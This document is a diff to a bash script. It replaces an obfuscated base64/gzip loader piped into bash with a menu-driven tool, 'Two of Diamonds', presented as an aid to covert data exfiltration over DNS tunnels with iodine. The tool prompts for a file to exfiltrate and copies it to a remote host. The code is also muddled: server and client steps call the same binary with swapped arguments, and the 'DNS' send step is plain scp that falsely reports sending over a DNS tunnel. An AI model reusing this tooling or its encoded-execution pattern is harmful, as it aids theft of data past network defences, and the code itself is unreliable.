@@ -1,1 +1,91 @@
-bash -c "$(echo H4sICLrOcGcAA1R3b19vZl9EaWFtb25kcwDlVt9vGjkQft+/YkpRW6pjCaW6h6D2dEqolIem6OAeTrkKOevZYGXX3tpeUvrjf7+xvRAgC4Um0el0fkgW7/qbmW++mfHTJ51LITuXzEyj6OSv38/fPP/7qNe76PZ7v+bPoz8Go8G42jqi39FTeI+yhFRpsFOE8Y0ClcKpYLmS3MAJ0zyyN2qi0gmvNic5nXjRgq8R0EoyZNo/YTJV0EZoNL86w98bt7sN8GvyYOsO9jfYuTbj2rW+7Qk++JyKzGpmEU6ZZfBhhhpOz0eHgj8cK/t6/lOrFnw8FQYSEgkUWs0ERwNMgpAWdcoSBKugtCITX9AzY0spMRPyygsuUcSY3Q7OHau4YFkoGcOZhQzpFLsiS1apzEAmrhGE4kJ6c5fzghkDEkm1+no7uEZjtUgcrPOZg0H6402qRSI/lagFmvhgWh6V80cF78YwQgt/Fp6A8TJfI9SOlfuBv9oCfpIJlPae4D0HTilcr8VgZH/oLeCvYyp3cYCL+4M/TvmHPuzbfdWINTIO7QIaA1edMFclVeBUiQSPyZXwFDo6MwjNsEGlHC1877aoRmxZTLg0ExP00O8vX79afZ2EjK687rV8hU1chblPVt+9blGZE7tHq5svWxVNZ3LGMsErF2MY6zmwKyZk3OiDyRAL6Pahbkgt4NCwJPruhp2TX1ls9KIQS7QZ3B4jjuCsQ9hSLnEcr+dApNT08ty1m/Zs0bSeve1wnHVkmWV9N4RvGd9ImRvQXOUUOUiWYxjaS5MvML6KfyEiWV5kGJOdlktsOLAL8mwIjHPqh2Z5DXDBBBIcRHiaiGKJcocHy7QnogqpUseNsNPKgWNoVq674M+G9HsJu86R5ynAtFOysPysQT8CRqXzzOBWjwZaK3K+AqIhJZUlMRvLsgx5fNdk0NqQUm1w8eHieGlcbL5iCpZc0/AByiH903EASMVKiUnoQttAW3ueh55YJudwjXM3oDTJTEv35Jh2MiWZBJg6De/QbSiyaLPq7qPb0In/c7qlq91DyLbqWltlW8n6EPVWgl3T8f9QvXeuViH/0dpI2Eu4krto6ob8D1RrkuIwydK9098olzdQPyjd7q5Ttxr0OqmTofOk0XRAa7o47ti86KzIKIWLC2j+RvF/otH48eOGy3X8vHM+e2gwZZJQ8lKKde5Gr90kv05Gq6LcIcx3jCxwR46/NTt7NWiVrvZR+uhk+NMyd2f/bY3X7v8DAa7KCIwPAAA= | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+# Menu for the Two of Diamonds Card
+two_of_diamonds_menu() {
+    clear
+    echo -e "${CYAN}"
+    echo "      __________________________________________________________________________"
+    echo "     |                              Two of Diamonds                             |"
+    echo "     |                     Exfiltrate Data Over DNS                             |"
+    echo "     |__________________________________________________________________________|"
+    echo "     |                                                                          |"
+    echo "     |  This card provides an interface to utilize DNS tunneling for covert     |"
+    echo "     |  data exfiltration. It leverages tools like iodine to bypass network     |"
+    echo "     |  restrictions and send data over DNS queries.                            |"
+    echo "     |                                                                          |"
+    echo "     |                                                                          |"
+    echo "     |  1. Set Up DNS Tunneling Server                                          |"
+    echo "     |  2. Set Up DNS Tunneling Client                                          |"
+    echo "     |  3. Send Data Over DNS Tunnel                                            |"
+    echo "     |  4. Exit                                                                 |"
+    echo "     |__________________________________________________________________________|"
+    echo -e "${RESET}"
+    read -p "Enter your choice: " choice
+    case $choice in
+        1) setup_dns_server ;;
+        2) setup_dns_client ;;
+        3) send_data_dns ;;
+        4) exit 0 ;;
+        *) echo "Invalid choice. Try again."; sleep 1; two_of_diamonds_menu ;;
+    esac
+}
+
+# Set up DNS tunneling server
+setup_dns_server() {
+    clear
+    echo -e "${CYAN}Setting Up DNS Tunneling Server...${RESET}"
+    if command -v iodine &>/dev/null; then
+        read -p "Enter the domain name for tunneling (e.g., example.com): " domain
+        read -p "Enter the IP address for the DNS server: " server_ip
+        echo -e "${CYAN}Starting iodine server with domain: $domain and IP: $server_ip${RESET}"
+        iodine -f "$server_ip" "$domain"
+    else
+        echo -e "${CYAN}Error: iodine is not installed.${RESET}"
+        echo "Please install iodine using your package manager."
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    two_of_diamonds_menu
+}
+
+# Set up DNS tunneling client
+setup_dns_client() {
+    clear
+    echo -e "${CYAN}Setting Up DNS Tunneling Client...${RESET}"
+    if command -v iodine &>/dev/null; then
+        read -p "Enter the domain name for tunneling (e.g., example.com): " domain
+        read -p "Enter the IP address of the DNS server: " server_ip
+        echo -e "${CYAN}Starting iodine client with domain: $domain and server IP: $server_ip${RESET}"
+        iodine -f "$domain" "$server_ip"
+    else
+        echo -e "${CYAN}Error: iodine is not installed.${RESET}"
+        echo "Please install iodine using your package manager."
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    two_of_diamonds_menu
+}
+
+# Send data over DNS tunnel
+send_data_dns() {
+    clear
+    echo -e "${CYAN}Sending Data Over DNS Tunnel...${RESET}"
+    if command -v scp &>/dev/null; then
+        read -p "Enter the file to exfiltrate: " file
+        read -p "Enter the DNS server IP: " server_ip
+        scp "$file" "$server_ip:/tmp/"
+        if [[ $? -eq 0 ]]; then
+            echo -e "${CYAN}File $file successfully sent over DNS tunnel.${RESET}"
+        else
+            echo -e "${CYAN}Error: Failed to send file.${RESET}"
+        fi
+    else
+        echo -e "${CYAN}Error: SCP is not installed.${RESET}"
+        echo "Please install SCP using your package manager."
+    fi
+    read -n 1 -s -r -p "Press any key to return to the menu..."
+    two_of_diamonds_menu
+}
+
+two_of_diamonds_menu
